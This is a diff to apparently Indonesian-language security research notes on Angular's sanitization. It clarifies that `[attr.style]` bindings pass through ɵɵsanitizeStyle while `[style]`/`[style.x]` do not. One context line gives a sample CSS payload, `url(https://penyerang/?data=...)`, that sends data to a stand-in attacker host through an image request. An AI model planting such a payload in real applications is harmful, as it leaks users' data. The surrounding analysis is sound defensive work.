@@ -100,6 +100,12 @@ styling TANPA pemeriksaan tipe pembungkus?
    SecurityContext.STYLE -> `ɵɵsanitizeStyle` di resolve_sanitizers.ts:22,
    tetapi pemetaan itu berlaku untuk binding properti/atribut biasa - BUKAN
    untuk instruksi styling khusus.
+   Bukti empiris bahwa `ɵɵsanitizeStyle` bukan kode mati, melainkan dipakai
+   pada bentuk ATRIBUT (berkas ekspektasi kompilasi):
+     compiler-cli/test/compliance/test_cases/r3_view_compiler_bindings/
+       property_bindings/sanitization.js:8
+         ɵɵattribute("style", ctx.evil, ɵɵsanitizeStyle);
+   Jadi: `[attr.style]` DISANITASI, sedangkan `[style]`/`[style.x]` tidak.
 
 2. Alasannya terletak pada BENTUK PENULISAN. `renderer.setStyle(node, prop,
    value)` menulis SATU properti CSS lewat CSSOM. Peramban mem-parse nilai
@@ -120,7 +126,9 @@ styling TANPA pemeriksaan tipe pembungkus?
    bila aplikasi mengikat data pengguna ke `[style.background]` - misalnya
    `url(https://penyerang/?data=...)` untuk eksfiltrasi via permintaan gambar.
    Ini bukan XSS dan bukan cacat framework, tetapi layak diketahui: konteks
-   STYLE praktis tidak disanitasi di Angular modern.
+   STYLE tidak disanitasi PADA BENTUK INSTRUKSI STYLING (`[style]`/`[style.x]`).
+   Bentuk `[attr.style]` tetap melewati ɵɵsanitizeStyle - lihat butir 1.
+   Uji keterjangkauannya ada di analysis/SINK-REACHABILITY.txt R-06.
 
 DAFTAR FUNGSI YANG SUDAH DIPAHAMI
 ---------------------------------
